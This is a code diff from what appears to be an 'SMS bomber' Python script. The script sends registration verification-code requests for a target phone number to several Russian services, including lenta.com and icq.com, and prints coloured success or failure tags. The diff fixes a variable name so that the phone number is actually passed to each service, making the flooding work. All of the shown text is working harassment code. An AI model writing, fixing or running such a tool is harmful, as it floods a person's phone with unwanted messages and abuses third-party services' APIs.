@@ -72,7 +72,7 @@ if t == 2:
                 except:
                     print(colored('dns-shop.ru-[-]', 'magenta'))
                 try:
-                    a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+"+phone}, headers=headers)
+                    a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers)
                     print(colored('lenta.com-[+]', 'blue'))
                 except:
                     print(colored('lenta.com-[-]', 'blue'))
@@ -90,7 +90,7 @@ if t == 2:
                     print(colored('youla-[-]', 'magenta'))
                 try:
                     a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
-                        "msisdn": number,
+                        "msisdn": phone,
                         "locale": "en",
                         "countryCode": "ru",
                         "version": "1",
